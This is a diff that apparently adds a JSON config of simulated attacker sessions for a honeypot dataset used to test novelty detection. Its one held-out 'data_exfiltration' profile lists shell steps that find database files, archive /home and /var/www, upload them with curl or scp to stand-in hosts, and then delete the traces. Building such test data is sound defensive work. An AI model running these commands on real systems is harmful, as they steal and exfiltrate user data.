@@ -1,0 +1,104 @@
+{
+  "version": "2.1.0-docnet",
+  "description": "Labelled traffic profiles for the honeypot dataset release. Each profile mirrors the style of configs/attack_profiles.json but adds a ground-truth category/label, randomised credentials, and optional steps so sessions are not near-duplicates. Steps: a command string, a list of alternatives (one is chosen), or {\"p\": probability, \"cmd\": ...} for an optional step. {placeholders} are filled from the pools below; held_out profiles are kept out of the DEC training set to test novelty detection.",
+  "placeholders": {
+    "ip": [
+      "192.0.2.10",
+      "198.51.100.20",
+      "203.0.113.30",
+      "192.0.2.40"
+    ],
+    "lan_ip": [
+      "192.0.2.5",
+      "192.0.2.12",
+      "198.51.100.10",
+      "203.0.113.8"
+    ],
+    "domain": [
+      "files.example",
+      "mirror.example",
+      "pkg-repo.example"
+    ],
+    "bin": [
+      "b.sh",
+      "malware.sh",
+      "update.sh",
+      "payload"
+    ],
+    "user": [
+      "support",
+      "sysbackup",
+      "ftpuser"
+    ],
+    "dir": [
+      "/tmp",
+      "/var/tmp",
+      "/dev/shm"
+    ]
+  },
+  "profiles": [
+    {
+      "name": "data_exfiltration",
+      "attack_cat": "exfiltration",
+      "label": 1,
+      "held_out": true,
+      "description": "HELD OUT (novel): locating and copying out data files. Excluded from DEC training to test novelty detection.",
+      "credentials": {
+        "usernames": [
+          "root",
+          "backup"
+        ],
+        "passwords": [
+          "backup123",
+          "admin2026"
+        ],
+        "failed_attempts": [
+          0,
+          1
+        ]
+      },
+      "delay_range": [
+        0.5,
+        3.0
+      ],
+      "steps": [
+        [
+          "find / -name '*.sql' 2>/dev/null",
+          "find /home -name '*.db' 2>/dev/null"
+        ],
+        {
+          "p": 0.7,
+          "cmd": [
+            "du -sh /home /var/www",
+            "ls -la /var/backups"
+          ]
+        },
+        [
+          "tar czf {dir}/d.tgz /home",
+          "tar cf {dir}/d.tar /var/www"
+        ],
+        {
+          "p": 0.8,
+          "cmd": [
+            "curl -T {dir}/d.tgz http://{ip}/u",
+            "scp {dir}/d.tar root@{lan_ip}:/tmp/"
+          ]
+        },
+        {
+          "p": 0.5,
+          "cmd": [
+            "rm -f {dir}/d.tgz {dir}/d.tar"
+          ]
+        }
+      ],
+      "noise_pool": [
+        "id",
+        "ls"
+      ],
+      "noise_count": [
+        0,
+        1
+      ]
+    }
+  ]
+}
